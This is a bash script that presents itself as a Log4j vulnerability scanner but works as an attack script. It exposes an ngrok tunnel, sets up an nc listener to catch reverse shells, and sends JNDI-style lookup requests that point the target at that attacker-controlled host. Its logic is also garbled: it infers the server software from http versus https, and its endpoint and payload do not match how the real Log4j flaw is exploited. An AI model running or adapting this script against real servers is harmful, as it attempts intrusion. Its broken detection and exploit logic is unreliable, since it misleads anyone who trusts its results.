#!/bin/bash

echo "Vulnerability Scanner for Log4j"
echo "Checking if the server is vulnerable..."

read -p "Enter the URL of the website: " url

# Extract the server type and the server's IP address and port
if [[ "$url" == "http://"* ]]; then
    serverType="Apache"
    ipAddressAndPort=${url:7}
elif [[ "$url" == "https://"* ]]; then
    serverType="Nginx"
    ipAddressAndPort=${url:8}
else
    echo "Invalid URL. Please try again."
    exit 1
fi

echo "Server type: $serverType"
echo "IP address and port: $ipAddressAndPort"

# Check if Log4j is present on the target server
echo "Checking for Log4j presence..."
log4jCheck=$(curl -s "$url" | grep -i "log4j")
if [[ -z "$log4jCheck" ]]; then
    echo "Log4j not detected on the target server. Exiting."
    exit 1
fi

echo "Log4j detected on the target server."

# Start a public HTTP server using ngrok
ngrok http 8888 > /dev/null 2>&1 &
sleep 5  # Wait for ngrok to start and provide the public URL

# Get the public URL from ngrok
publicUrl=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url)

# Detecting Log4j vulnerability
echo "Checking for Log4j vulnerability..."

# Setup a listener to catch reverse shells
nc -l -p 4444 > output.txt &

# Generate a payload file for Log4j vulnerability
echo "Greeting from Log4j!" > payload.txt

if [ "$serverType" == "Apache" ]; then
    curl "http://$ipAddressAndPort/jndi-manager/lookup?name=$publicUrl/payload.txt" > /dev/null 2>&1
else
    curl "https://$ipAddressAndPort/jndi-manager/lookup?name=$publicUrl/payload.txt" > /dev/null 2>&1
fi

# Wait for the reverse shell to establish
echo "Waiting for the reverse shell to establish..."
sleep 5

# Catch reverse shell output
output=$(cat output.txt)
echo "Reverse shell output: $output"

# Stop listener
echo "Stopping listener..."
killall nc

# Stop ngrok
killall ngrok
